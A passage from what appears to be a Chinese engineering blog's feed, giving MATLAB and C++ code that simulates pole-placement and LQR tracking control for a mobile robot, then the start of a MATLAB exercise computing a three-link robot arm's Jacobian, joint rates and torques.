class="hljs-keyword">if</span> all(<span class="hljs-built_in">abs</span>(x_pp(k:<span class="hljs-keyword">end</span>,<span class="hljs-number">1</span>)) &lt;= settling_threshold_xe)<br>        ts_xe_pp = t_pp(k);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-comment">% 超调量</span><br><span class="hljs-keyword">if</span> initial_xe &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">min</span>(x_pp(:,<span class="hljs-number">1</span>)) &lt; -<span class="hljs-built_in">eps</span> <span class="hljs-comment">% 从正值开始，穿过0到负值</span><br>    overshoot_xe_pp = <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">min</span>(x_pp(:,<span class="hljs-number">1</span>))) / initial_xe * <span class="hljs-number">100</span>;<br><span class="hljs-keyword">elseif</span> initial_xe &lt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">max</span>(x_pp(:,<span class="hljs-number">1</span>)) &gt; <span class="hljs-built_in">eps</span> <span class="hljs-comment">% 从负值开始，穿过0到正值</span><br>    overshoot_xe_pp = <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">max</span>(x_pp(:,<span class="hljs-number">1</span>))) / <span class="hljs-built_in">abs</span>(initial_xe) * <span class="hljs-number">100</span>;<br><span class="hljs-keyword">end</span><br>fprintf(<span class="hljs-string">&#x27;x_e (极点配置): 超调量 ≈ %.2f%%, 调节时间 (2%%) ≈ %.2f s\n&#x27;</span>, overshoot_xe_pp, ts_xe_pp);<br><span class="hljs-keyword">if</span> overshoot_xe_pp &lt;= Mp_spec*<span class="hljs-number">100</span> &amp;&amp; ts_xe_pp &lt;= ts_spec<br>    fprintf(<span class="hljs-string">&#x27;x_e 响应满足设计指标。\n&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    fprintf(<span class="hljs-string">&#x27;x_e 响应未能完全满足设计指标。可能需要调整期望极点。\n&#x27;</span>);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% 对 y_e 和 theta_e 进行类似分析，但通常性能指标是针对系统整体主导行为。</span><br><span class="hljs-comment">% 这里主要关注x_e的指标，因为它是直接被u_v控制的，而y_e主要通过耦合影响。</span><br><span class="hljs-comment">% 实际应用中，可能需要综合评估所有状态的响应。</span><br></code></pre></td></tr></table></figure><h3 id="c仿真">3.2 c++仿真</h3><p>基于opencv和Eigen库，使用c++简单实现了LQR控制器的仿真。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Eigen/Dense&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;opencv2/opencv.hpp&quot;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> cv;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> Eigen;<br><br><span class="hljs-keyword">constexpr</span>  <span class="hljs-type">double</span> v_r = <span class="hljs-number">0.4</span>; <span class="hljs-comment">// reference linear velocity</span><br><span class="hljs-keyword">constexpr</span>  <span class="hljs-type">double</span> w_r = <span class="hljs-number">0.5</span>; <span class="hljs-comment">// reference angular velocity</span><br><span class="hljs-keyword">constexpr</span>  <span class="hljs-type">double</span> radius = <span class="hljs-number">2.0</span>; <span class="hljs-comment">// radius of the circle</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">double</span> dt = <span class="hljs-number">0.01</span>; <span class="hljs-comment">// time step</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">double</span> sim_time = <span class="hljs-number">10.0</span>; <span class="hljs-comment">// total simulation time</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">int</span> steps = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(sim_time / dt); <span class="hljs-comment">// number of steps</span><br><br><span class="hljs-function">MatrixXd <span class="hljs-title">SolveLQR</span><span class="hljs-params">(<span class="hljs-type">const</span> MatrixXd&amp; A, <span class="hljs-type">const</span> MatrixXd&amp; B, <span class="hljs-type">const</span> MatrixXd&amp; Q, <span class="hljs-type">const</span> MatrixXd&amp; R)</span></span>&#123;<br>    <span class="hljs-comment">// solve Algebraic Riccati equation: A&#x27;P + PA - PBR^(-1)B&#x27;P + Q = 0</span><br>    MatrixXd P = Q;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)&#123;<br>        MatrixXd P_next = Q + A.<span class="hljs-built_in">transpose</span>() * P * A - A.<span class="hljs-built_in">transpose</span>() * P * B * (R + B.<span class="hljs-built_in">transpose</span>() * P * B).<span class="hljs-built_in">inverse</span>() * B.<span class="hljs-built_in">transpose</span>() * P * A;<br>        <span class="hljs-keyword">if</span>((P_next - P).<span class="hljs-built_in">norm</span>() &lt; <span class="hljs-number">1e-6</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        cout&lt;&lt;<span class="hljs-string">&quot;Iteration &quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;: P norm = &quot;</span> &lt;&lt; (P_next - P).<span class="hljs-built_in">norm</span>() &lt;&lt; endl;<br>        P = P_next;<br>    &#125;<br>    <span class="hljs-comment">// optimal gain matrix K = R^(-1)B&#x27;P</span><br>    <span class="hljs-keyword">return</span> (R + B.<span class="hljs-built_in">transpose</span>() * P * B).<span class="hljs-built_in">inverse</span>() * B.<span class="hljs-built_in">transpose</span>() * P;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">// state space model</span><br>    Matrix3d A;<br>    A &lt;&lt; <span class="hljs-number">0</span>, w_r, <span class="hljs-number">0</span>,<br>         -w_r, <span class="hljs-number">0</span>, v_r,<br>         <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>;<br>    <span class="hljs-function">MatrixXd <span class="hljs-title">B</span><span class="hljs-params">(<span class="hljs-number">3</span>, <span class="hljs-number">2</span>)</span></span>;<br>    B &lt;&lt; <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,<br>         <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>         <span class="hljs-number">0</span>, <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// LQR parameters</span><br>    Matrix3d Q;<br>    Q &lt;&lt; <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>         <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>,<br>         <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>; <span class="hljs-comment">// state cost</span><br>    Matrix2d R;<br>    R &lt;&lt; <span class="hljs-number">1</span>, <span class="hljs-number">0</span>,<br>         <span class="hljs-number">0</span>, <span class="hljs-number">1</span>; <span class="hljs-comment">// control cost</span><br>    Matrix&lt;<span class="hljs-type">double</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&gt; K = <span class="hljs-built_in">SolveLQR</span>(A, B, Q, R);<br>    cout&lt;&lt;<span class="hljs-string">&quot;K matrix:\n&quot;</span> &lt;&lt; K &lt;&lt; endl;<br>    <span class="hljs-comment">// state initialization</span><br>    <span class="hljs-function">Vector3d <span class="hljs-title">x_e</span><span class="hljs-params">(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">0.1</span>)</span></span>; <span class="hljs-comment">// initial error state</span><br>    vector&lt;cv::Point&gt; trajectory, reference_trajectory;<br><br>    <span class="hljs-comment">// graphics setup</span><br>    <span class="hljs-type">int</span> size = <span class="hljs-number">600</span>;<br>    <span class="hljs-type">int</span> origin = size &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">double</span> scale = <span class="hljs-number">100.0</span>; <span class="hljs-comment">// 1m = 100 pixels</span><br>    <span class="hljs-function">Mat <span class="hljs-title">canvas</span><span class="hljs-params">(size, size, CV_8UC3, Scalar(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))</span></span>;<br><br>    <span class="hljs-comment">// simulation loop</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; steps; i++) &#123;<br>        <span class="hljs-type">double</span> t = i * dt;<br>        <span class="hljs-type">double</span> x_r = radius * <span class="hljs-built_in">cos</span>(w_r * t);<br>        <span class="hljs-type">double</span> y_r = radius * <span class="hljs-built_in">sin</span>(w_r * t);<br>        <span class="hljs-type">double</span> theta_r = w_r * t;<br><br>        <span class="hljs-comment">// control law</span><br>        Vector2d u = -K * x_e;<br><br>        <span class="hljs-comment">// update error state</span><br>        Vector3d dx_e = A * x_e + B * u;<br>        x_e += dx_e * dt;<br><br>        <span class="hljs-comment">// convert error to global coordinates</span><br>        Matrix2d R_theta;<br>        R_theta &lt;&lt; <span class="hljs-built_in">cos</span>(theta_r), -<span class="hljs-built_in">sin</span>(theta_r),<br>                <span class="hljs-built_in">sin</span>(theta_r), <span class="hljs-built_in">cos</span>(theta_r);<br>        Vector2d pe = R_theta * x_e.<span class="hljs-built_in">head</span>&lt;<span class="hljs-number">2</span>&gt;();<br><br>        <span class="hljs-type">double</span> x = x_r + <span class="hljs-built_in">pe</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">double</span> y = y_r + <span class="hljs-built_in">pe</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// store trajectory points</span><br>        <span class="hljs-function">cv::Point <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(origin + x * scale), <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(origin - y * scale))</span></span>;<br>        trajectory.<span class="hljs-built_in">push_back</span>(p);<br>        reference_trajectory.<span class="hljs-built_in">emplace_back</span>(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(origin + x_r * scale),<br>                                          <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(origin - y_r * scale));<br>    &#125;<br>    <span class="hljs-comment">// draw trajectory</span><br>    canvas = <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>); <span class="hljs-comment">// clear canvas</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; trajectory.<span class="hljs-built_in">size</span>(); i++)&#123;<br>        <span class="hljs-comment">// draw start point</span><br>        <span class="hljs-keyword">if</span>(i == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">circle</span>(canvas, trajectory[i], <span class="hljs-number">5</span>, <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>), <span class="hljs-number">-1</span>); <span class="hljs-comment">// start point in green</span><br>        &#125;<br>        <span class="hljs-keyword">if</span>(i == trajectory.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-built_in">circle</span>(canvas, trajectory[i], <span class="hljs-number">5</span>, <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>), <span class="hljs-number">-1</span>); <span class="hljs-comment">// end point in red</span><br>        &#125;<br>        <span class="hljs-built_in">circle</span>(canvas, trajectory[i], <span class="hljs-number">1</span>, <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">211</span>, <span class="hljs-number">85</span>, <span class="hljs-number">186</span>), <span class="hljs-number">-1</span>);<br>        <span class="hljs-built_in">circle</span>(canvas, reference_trajectory[i], <span class="hljs-number">1</span>, <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span>(i != <span class="hljs-number">0</span> &amp;&amp; i != trajectory.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &amp;&amp; i % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">circle</span>(canvas, trajectory[i], <span class="hljs-number">5</span>, <span class="hljs-built_in">Scalar</span>(<span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">240</span>), <span class="hljs-number">1</span>); <span class="hljs-comment">// draw current position</span><br><br>        <span class="hljs-comment">// display the canvas</span><br>        <span class="hljs-built_in">imshow</span>(<span class="hljs-string">&quot;LQR Trajectory&quot;</span>, canvas);<br>        <span class="hljs-type">char</span> key = (<span class="hljs-type">char</span>)<span class="hljs-built_in">waitKey</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span>(key == <span class="hljs-number">27</span>) &#123; <span class="hljs-comment">// ESC key to exit</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// wait for a key press before closing</span><br>    <span class="hljs-built_in">waitKey</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="仿真结果">3.3 仿真结果</h3><p><imgsrc="/img/pole-assignment-lqr-tracking-simulation-for-modern-control-theory/matlab.png"alt="matlab仿真结果" /><br /><imgsrc="/img/pole-assignment-lqr-tracking-simulation-for-modern-control-theory/matlab_output.png"alt="matlab输出结果" /><br /><imgsrc="/img/pole-assignment-lqr-tracking-simulation-for-modern-control-theory/cpp.png"alt="c++仿真结果" /></p><h2 id="总结">4 总结</h2><p>本文通过推导移动机器人跟踪误差的线性状态空间模型，设计了极点配置和LQR控制器，并在MATLAB和C++中进行了仿真。结果表明，所设计的控制器能够有效地跟踪参考轨迹，满足超调量和调节时间的要求。极点配置方法和LQR方法都能实现稳定的跟踪控制，但LQR方法在处理多变量系统时更为灵活和高效。</p><p>代码见<ahref="https://github.com/symcreg/lqr_simulation">github</a>，仿真视频见<ahref="https://www.bilibili.com/video/BV1stTjz9EXX">bilibili</a>。</p>]]></content>
    
    
    <categories>
      
      <category>控制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>robotics section 5 jacobian matlab practice</title>
    <link href="/2025/05/29/robotics-section-5-jacobian-matlab-practice/"/>
    <url>/2025/05/29/robotics-section-5-jacobian-matlab-practice/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="robotics-section-5-jacobian-matlab-practice">robotics section 5jacobian matlab practice</h1><h2 id="题目">题目</h2><figure><img src="/img/robotics-section-5-jacobian-matlab-practice/problem1.png"alt="problem1" /><figcaption aria-hidden="true">problem1</figcaption></figure><figure><img src="/img/robotics-section-5-jacobian-matlab-practice/problem2.png"alt="problem2" /><figcaption aria-hidden="true">problem2</figcaption></figure><h2 id="代码">代码</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% (3)</span><br><br><span class="hljs-comment">% 1)</span><br>clear;clc;<br><br><span class="hljs-comment">%初始化参数</span><br>L=[<span class="hljs-number">4</span>;<span class="hljs-number">3</span>;<span class="hljs-number">2</span>];  <span class="hljs-comment">%连杆长度</span><br>Theta=deg2rad([<span class="hljs-number">10</span>;<span class="hljs-number">20</span>;<span class="hljs-number">30</span>]);  <span class="hljs-comment">%起始关节角</span><br>X_d=[<span class="hljs-number">0.2</span>;<span class="hljs-number">-0.3</span>;<span class="hljs-number">-0.2</span>];    <span class="hljs-comment">%恒定的期望笛卡尔速度</span><br>W=[<span class="hljs-number">1</span>;<span class="hljs-number">2</span>;<span class="hljs-number">3</span>];  <span class="hljs-comment">%恒定的期望笛卡尔力和力矩</span><br>dt=<span class="hljs-number">0.1</span>; <span class="hljs-comment">%时步</span><br>duration=<span class="hljs-number">5</span>; <span class="hljs-comment">%仿真时间</span><br><br><span class="hljs-comment">%机器人工具箱</span><br>link(<span class="hljs-number">1</span>)=Link(<span class="hljs-string">&#x27;alpha&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;modified&#x27;</span>);<br>link(<span class="hljs-number">2</span>)=Link(<span class="hljs-string">&#x27;alpha&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>,L(<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;modified&#x27;</span>);<br>link(<span class="hljs-number">3</span>)=Link(<span class="hljs-string">&#x27;alpha&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>,L(<span class="hljs-number">2</span>),<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;modified&#x27;</span>);<br>bot=SerialLink(link,<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;robot&#x27;</span>,<span class="hljs-string">&#x27;tool&#x27;</span>,[L(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]);<br><br><span class="hljs-comment">%创建各个参数的list，用于存储</span><br>Theta_d_list=<span class="hljs-built_in">zeros</span>([<span class="hljs-number">3</span>,duration/dt]);<br>Theta_list=<span class="hljs-built_in">zeros</span>([<span class="hljs-number">3</span>,duration/dt]);<br>X_list=<span class="hljs-built_in">zeros</span>([<span class="hljs-number">3</span>,duration/dt]);<br>J_det_list=<span class="hljs-built_in">zeros</span>([<span class="hljs-number">1</span>,duration/dt]);<br>T_list=<span class="hljs-built_in">zeros</span>([<span class="hljs-number">3</span>,duration/dt]);<br><br><span class="hljs-comment">%仿真</span><br>idex=<span class="hljs-number">1</span>; <span class="hljs-comment">%list的下标</span><br><span class="hljs-keyword">for</span> t=<span class="hljs-number">0</span>:dt:duration<br>    <br>    <span class="hljs-comment">%以当前的关节角度求出以下参数：</span><br>    <span class="hljs-comment">%雅可比矩阵</span><br>    J=[-L(<span class="hljs-number">1</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>))-L(<span class="hljs-number">2</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>))-L(<span class="hljs-number">3</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>))... <br>       -L(<span class="hljs-number">2</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>))-L(<span class="hljs-number">3</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>))...<br>       -L(<span class="hljs-number">3</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>));<br>        L(<span class="hljs-number">1</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>))+L(<span class="hljs-number">2</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>))+L(<span class="hljs-number">3</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>))...<br>        L(<span class="hljs-number">2</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>))+L(<span class="hljs-number">3</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>))...<br>        L(<span class="hljs-number">3</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>));<br>        <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span>;];<br>    <span class="hljs-comment">%关节角速度，式5.72</span><br>    Theta_d=J\X_d;<br>    <span class="hljs-comment">%3个笛卡尔分量</span><br>    <span class="hljs-comment">%由T0H的第1行第4列得x，%由T0H的第2行第4列得y，%三个关节角相加得phi</span><br>    X=[L(<span class="hljs-number">3</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>))+L(<span class="hljs-number">2</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>))+L(<span class="hljs-number">1</span>)*<span class="hljs-built_in">cos</span>(Theta(<span class="hljs-number">1</span>));<br>        L(<span class="hljs-number">3</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>))+L(<span class="hljs-number">2</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>))+L(<span class="hljs-number">1</span>)*<span class="hljs-built_in">sin</span>(Theta(<span class="hljs-number">1</span>));<br>        Theta(<span class="hljs-number">1</span>)+Theta(<span class="hljs-number">2</span>)+Theta(<span class="hljs-number">3</span>)];<br>    <span class="hljs-comment">%雅可比矩阵行列式</span><br>    J_det=det(J);<br>    <span class="hljs-comment">%3个活动关节力矩，式5.97</span><br>    T=J&#x27;*W;<br>    <br>    <span class="hljs-comment">%将各参数存到各自的list中</span><br>    Theta_d_list(:,idex)=Theta_d;   <br>    Theta_list(:,idex)=rad2deg(Theta);  <span class="hljs-comment">%以角度制存储关节角度</span><br>    X_list(:,idex)=X;<br>    J_det_list(idex)=det(J);<br>    T_list(:,idex)=T;<br>    <br>    <span class="hljs-comment">%更新关节角</span><br>    Theta=Theta+Theta_d*dt;<br>    <span class="hljs-comment">%list的下标idex加一</span><br>    idex=idex+<span class="hljs-number">1</span>;<br>    <br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">%绘图</span><br>t=<span class="hljs-number">0</span>:dt:duration;<br><br><span class="hljs-built_in">figure</span><br><span class="hljs-built_in">plot</span>(t,Theta_d_list)<br>title(<span class="hljs-string">&#x27;3个主动关节速率与时间的关系&#x27;</span>)<br>grid on<br>xlabel(<span class="hljs-string">&#x27;t/s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;$\dot&#123;\Theta &#125;/(rad\cdot s^&#123;-1&#125; )$&#x27;</span>,<span class="hljs-string">&#x27;Interpreter&#x27;</span>,<span class="hljs-string">&#x27;latex&#x27;</span>)<br><span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;$\dot&#123;\theta &#125;_1$&#x27;</span>,<span class="hljs-string">&#x27;$\dot&#123;\theta &#125;_2$&#x27;</span>,<span class="hljs-string">&#x27;$\dot&#123;\theta &#125;_3$&#x27;</span>...<br>    ,<span class="hljs-string">&#x27;Interpreter&#x27;</span>,<span class="hljs-string">&#x27;latex&#x27;</span>)<br><br><span class="hljs-built_in">figure</span><br><span class="hljs-built_in">plot</span>(t,Theta_list)<br>title(<span class="hljs-string">&#x27;3个主动关节角与时间的关系&#x27;</span>)<br>grid on<br>xlabel(<span class="hljs-string">&#x27;t/s&#x27;</span>)<br>ylabel(<span class="hljs-string">&#x27;$\Theta/^&#123;\circ&#125;$&#x27;</span>,<span class="hljs-string">&#x27;Interpreter&#x27;</span>,<span class="hljs-string">&#x27;latex&#x27;</span>)<br><span class="hljs-built_in">legend</span>(<span 